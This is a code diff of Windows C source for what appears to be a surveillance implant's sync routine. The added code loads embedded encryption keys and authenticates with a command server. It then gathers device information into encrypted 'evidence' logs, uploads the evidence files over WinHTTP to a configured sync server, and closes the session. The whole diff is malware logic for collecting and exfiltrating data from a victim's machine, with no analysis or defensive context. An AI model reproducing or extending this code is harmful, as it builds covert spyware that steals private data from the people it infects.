@@ -6,17 +6,27 @@
 #include "log_files.h"
 #include "win_http.h"
 #include "md5.h"
-//#include "sha1.h"
 #include "proto.h"
 
-BYTE pConfKey[16];
-BYTE pClientKey[16];
-BYTE pInstanceId[20];
+extern BYTE pServerKey[32];
+extern BYTE pConfKey[32];
+extern BYTE pSessionKey[20];
+extern BYTE pLogKey[32];
 
 
 VOID SyncThreadFunction()
 {
-	CreateLogFile(0x41414141, NULL, 0);
+	PBYTE pCryptedBuffer;
+
+	memcpy(pServerKey, CLIENT_KEY, 32);
+	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
+	memcpy(pLogKey, ENCRYPTION_KEY, 32);
+#ifdef _DEBUG_BINPATCH
+	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
+	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
+	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
+#endif
+
 	InitializeCommunications();
 	while(1)
 	{
@@ -24,9 +34,29 @@ VOID SyncThreadFunction()
 #ifdef _DEBUG
 		OutputDebugString(L"[*] Starting sync...\n");
 #endif
-		GetDeviceInfo();
-		ProtoAuthenticate();
+		// auth & id
+		if (SyncWithServer())
+		{
+			// get evidences
+			PWCHAR pDeviceInfo = GetDeviceInfo();
+			HANDLE hFile = CreateLogFile(PM_DEVICEINFO, NULL, 0);
+			WriteLogFile(hFile, (PBYTE)pDeviceInfo, wcslen(pDeviceInfo) * sizeof(WCHAR));
+			CloseHandle(hFile);
+			free(pDeviceInfo);
 
+			// for each file, send
+			ProcessEvidenceFiles();
+		}
+#ifdef _DEBUG
+		else
+			OutputDebugString(L"[!!] Cannot sync with server!!\n");
+#endif
+		// bye bye	
+		WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
+		free(pCryptedBuffer);
+
+		
+		break; // FIXME 
 
 	}
 }
@@ -37,7 +67,6 @@ VOID InitializeCommunications()
 	ULONG pServerPort;
 	BYTE pServerIp[32];
 
-	//GetUserUniqueHash(pInstanceId, sizeof(pInstanceId));
 	WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort);
 }
 
